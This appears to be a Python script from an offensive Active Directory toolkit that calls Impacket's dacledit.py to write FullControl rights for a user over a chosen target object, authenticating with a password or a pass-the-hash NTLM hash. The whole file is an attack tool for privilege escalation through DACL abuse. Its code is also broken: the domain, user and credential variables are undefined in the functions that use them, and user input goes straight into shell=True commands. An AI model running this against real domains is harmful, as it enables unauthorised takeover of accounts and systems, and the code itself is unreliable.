import os
import subprocess
from argument_parser import parse_arguments  # Import the parse_arguments function from argument_parser.py

# Install missing dependencies if necessary
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")

# Set colorama color constants
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

def GenericAllHash():
    tar = input(f"{CYAN}Target:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal {USER} -target {tar} {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    
def GenericAllPass():
    tar = input(f"{CYAN}Target:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal {USER} -target {tar} {DOMAIN}/{USER}:{PASS}"], shell=True)

def main():
    # Get the arguments from the argument_parser.py
    args = parse_arguments()

    # Extract arguments
    DOMAIN = args.DomainName
    USER = args.Username
    PASS = args.Password
    HASH = args.PassTheHash  

    # Execute the appropriate function based on the parsed arguments
    if HASH:
        GenericAllHash()  
    else:
        GenericAllPass()  

if __name__ == '__main__':
    main()